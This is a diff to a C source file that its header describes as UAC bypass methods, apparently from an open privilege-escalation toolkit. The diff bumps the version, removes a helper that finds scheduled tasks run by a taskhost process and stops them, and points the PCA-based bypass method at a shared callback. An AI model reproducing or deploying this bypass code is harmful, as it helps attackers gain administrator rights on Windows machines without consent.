@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2024
+*  (C) COPYRIGHT AUTHORS, 2020 - 2025
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.65
+*  VERSION:     3.67
 *
-*  DATE:        22 Sep 2023
+*  DATE:        11 Feb 2025
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -1400,114 +1400,6 @@ typedef struct _PCA_LOADER_BLOCK {
 } PCA_LOADER_BLOCK;
 
 /*
-* ucmxExamineTaskhost
-*
-* Purpose:
-*
-* Find all tasks registered with the host process and stop them.
-*
-*/
-BOOL ucmxExamineTaskhost(
-    _In_ HANDLE UniqueProcessId
-)
-{
-    HRESULT hr = E_FAIL;
-    ULONG processId;
-    LONG i, cTasks = 0;
-    VARIANT varDummy, varIndex;
-    ITaskService* pService = NULL;
-    IRunningTaskCollection* pTasks = NULL;
-    IRunningTask* pTask;
-    TASK_STATE taskState = TASK_STATE_UNKNOWN;
-
-    do {
-
-        hr = CoCreateInstance(&CLSID_TaskScheduler,
-            NULL,
-            CLSCTX_INPROC_SERVER,
-            &IID_ITaskService,
-            (void**)&pService);
-
-        HRESULT_BREAK_ON_FAILED(hr);
-
-        VariantInit(&varDummy);
-
-        hr = pService->lpVtbl->Connect(pService,
-            varDummy,
-            varDummy,
-            varDummy,
-            varDummy);
-
-        HRESULT_BREAK_ON_FAILED(hr);
-
-        hr = pService->lpVtbl->GetRunningTasks(pService,
-            TASK_ENUM_HIDDEN,
-            &pTasks);
-
-        HRESULT_BREAK_ON_FAILED(hr);
-
-        hr = pTasks->lpVtbl->get_Count(pTasks, &cTasks);
-
-        HRESULT_BREAK_ON_FAILED(hr);
-
-        varIndex.vt = VT_INT;
-
-        for (i = 1; i <= cTasks; i++) {
-
-            varIndex.lVal = i;
-
-            hr = pTasks->lpVtbl->get_Item(pTasks, varIndex, &pTask);
-            if (SUCCEEDED(hr)) {
-
-                processId = 0;
-                hr = pTask->lpVtbl->get_EnginePID(pTask, &processId);
-                if (SUCCEEDED(hr) && processId == HandleToUlong(UniqueProcessId)) {
-
-                    hr = pTask->lpVtbl->get_State(pTask, &taskState);
-                    if (taskState == TASK_STATE_RUNNING) {
-                        hr = pTask->lpVtbl->Stop(pTask);
-                    }
-                }
-                pTask->lpVtbl->Release(pTask);
-            }
-        }
-
-
-    } while (FALSE);
-
-    if (pTasks)
-        pTasks->lpVtbl->Release(pTasks);
-
-    if (pService)
-        pService->lpVtbl->Release(pService);
-
-    return SUCCEEDED(hr);
-}
-
-/*
-* ucmxEnumTaskhost
-*
-* Purpose:
-*
-* Callback for taskhost task enumeration.
-*
-*/
-BOOL CALLBACK ucmxEnumTaskhost(
-    _In_ PSYSTEM_PROCESS_INFORMATION ProcessEntry,
-    _In_ PVOID UserContext
-)
-{
-    PUNICODE_STRING targetProcess = (PUNICODE_STRING)UserContext;
-
-    if (!RtlEqualUnicodeString(&ProcessEntry->ImageName, targetProcess, TRUE))
-        return FALSE;
-
-    ucmxExamineTaskhost(ProcessEntry->UniqueProcessId);
-
-    return FALSE;
-}
-
-/*
 * ucmPcaMethod
 *
 * Purpose:
@@ -1651,7 +1543,7 @@ NTSTATUS ucmPcaMethod(
         }
 
         supEnumProcessesForSession(NtCurrentPeb()->SessionId,
-            (pfnEnumProcessCallback)ucmxEnumTaskhost, (PVOID)&uStrTaskhost);
+            (pfnEnumProcessCallback)supEnumTaskhostTasksCallback, (PVOID)&uStrTaskhost);
 
         //
         // Create destination dir "system32"
